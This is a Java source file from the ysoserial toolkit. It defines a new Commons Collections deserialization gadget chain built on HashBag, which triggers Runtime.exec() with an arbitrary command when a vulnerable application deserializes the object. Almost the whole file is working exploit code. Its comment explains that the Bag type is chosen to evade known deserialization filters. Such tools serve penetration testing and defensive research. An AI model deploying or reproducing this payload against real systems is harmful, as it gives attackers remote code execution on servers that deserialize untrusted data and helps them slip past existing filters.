package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.HashBag;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	HashBag (CC3) entry point — Bag type bypasses all Map/Set/Queue-based filters.

	Gadget chain:
		ObjectInputStream.readObject()
			HashBag.readObject()
				AbstractMapBag.doReadObject()
					HashMap.put(element, MutableInteger)
						element.hashCode()
							TiedMapEntry.hashCode()
								TiedMapEntry.getValue()
									LazyMap.get()
										ChainedTransformer.transform()
											InvokerTransformer.transform()
												Method.invoke()
													Runtime.exec()

	HashBag stores elements in an internal HashMap. On deserialization,
	doReadObject creates a new HashMap and re-inserts all elements.
	HashMap.put() calls element.hashCode(), triggering the chain.

	Filter evasion:
		1. HashBag (o.a.c.c.bag) — not in any known filter
		2. Bag type — not Map, Set, Queue, or List
		3. Different type hierarchy bypasses type-based filters
		4. Same InvokerTransformer sink as CC6/CC7

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections24 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// HashBag as entry gadget — Bag type, not Map or Set
		HashBag bag = new HashBag();
		bag.add(entry);  // hashCode fires safely with inert transformers

		// Remove cached "foo"→1 from innerMap
		innerMap.remove("foo");

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bag;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections24.class, args);
	}
}
